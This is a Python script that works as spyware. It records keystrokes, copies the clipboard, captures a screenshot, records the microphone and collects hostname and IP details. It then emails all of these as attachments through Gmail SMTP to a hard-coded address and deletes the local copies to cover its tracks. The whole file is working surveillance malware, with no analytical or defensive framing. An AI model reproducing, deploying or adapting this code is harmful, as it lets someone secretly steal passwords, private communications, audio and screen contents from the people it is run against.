
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
#send to email

#set sender email,password and receiver email before use
def send_email(filenames):
    fromaddr = "abcd@gmail.com"
    toaddr="xyz@gmail.com"
    password="password"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log Files"
    body = "Regarding Files"
    msg.attach(MIMEText(body, 'plain'))
    for i in filenames:
        filename=i
        attachment="./"+filename
        attachment = open(attachment, 'rb')
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

#get system information
import socket
import platform
def computer_information():
    with open("system.txt", "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


#get clipboard information
import pyperclip
def clipboard_information():
    clipboard_data = pyperclip.paste()
    with open("clipboard.txt", "w") as f:
        f.write(clipboard_data)


#get mic audio
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wavfile

def mic_information(filename="audio.wav", duration=1, fs=44100, channels=2):
    myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=channels)
    sd.wait()
    wavfile.write(filename, fs, myrecording)


#get screenshot
import pyscreenshot as ImageGrab
def screenshot_information():
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.png')


#captures keystrokes
import keyboard
from threading import Timer

keystrokes = []

def on_key_up(event):
    if event.event_type == 'up':  # Check if the event is a key release
        t=event.name
        pr=True
        if(len(t)==1):
            if(pr):
                keystrokes.append(t);
            else:
                keystrokes.append("\n"+t);
                pr=True
        else:
            keystrokes.append("\n"+t.upper())
            pr=False

def stop_logging():
    keyboard.unhook_all()
    with open("keys.txt", "w") as file:
        for i in keystrokes:
            file.write(i)
keyboard.hook(on_key_up)
timer = Timer(10.0, stop_logging)
timer.start()
computer_information()
mic_information()
clipboard_information()
screenshot_information()
timer.join()
files=["system.txt","clipboard.txt","keys.txt","audio.wav","screenshot.png"]
send_email(files)
import os
import glob
for i in files:
    os.remove(i)